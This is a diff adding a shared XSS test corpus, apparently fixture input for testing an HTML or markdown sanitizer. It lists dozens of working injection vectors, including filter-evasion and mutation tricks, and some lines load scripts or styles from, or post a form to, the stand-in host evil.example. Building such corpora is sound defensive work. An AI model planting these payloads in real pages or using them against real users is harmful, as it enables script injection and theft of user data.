@@ -1,0 +1,64 @@
+# Shared XSS corpus (P12-T05): one vector per line, ASCII only; lines starting with # are comments.
+# script
+<script>alert(1)</script>
+<SCRIPT SRC=//evil.example/x.js></SCRIPT>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script>alert&#40;1&#41;</script>
+# event handlers
+<img src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<IMG SRC=x ONERROR=alert(1)>
+<img/src=x/onerror=alert(1)>
+<body onload=alert(1)>
+<div onmouseover="alert(1)">hover</div>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)></video>
+<marquee onstart=alert(1)>x</marquee>
+# svg and math
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<math><mi xlink:href="javascript:alert(1)">x</mi></math>
+<math><mglyph><style><img src=x onerror=alert(1)>
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+# urls
+<a href="javascript:alert(1)">x</a>
+<a href="JaVaScRiPt:alert(1)">x</a>
+<a href="&#106;avascript:alert(1)">x</a>
+<a href="java&#x09;script:alert(1)">x</a>
+<a href="  javascript:alert(1)">x</a>
+<a href="vbscript:msgbox(1)">x</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+<a href="data:text/html,<script>alert(1)</script>">x</a>
+<img src="javascript:alert(1)">
+# frames and embeds
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<object data="javascript:alert(1)"></object>
+<embed src="data:text/html,<script>alert(1)</script>">
+<frameset onload=alert(1)>
+# document-level
+<base href="https://evil.example/">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<link rel="stylesheet" href="https://evil.example/x.css">
+<template><script>alert(1)</script></template>
+# css and forms
+<div style="width:expression(alert(1))">x</div>
+<div style="background:url(javascript:alert(1))">x</div>
+<style>@import 'https://evil.example/x.css';</style>
+<form action="https://evil.example/steal"><input type=submit></form>
+<button formaction="javascript:alert(1)">x</button>
+<form><button formaction=javascript:alert(1)>x</button></form>
+# markdown flavoured
+[x](javascript:alert(1))
+![x](javascript:alert(1))
+[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
+<https://x.example/"onmouseover="alert(1)>
+# mutation and encoding
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<textarea></textarea><img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<a href="x" onclick="alert(1)" onclick="alert(2)">x</a>
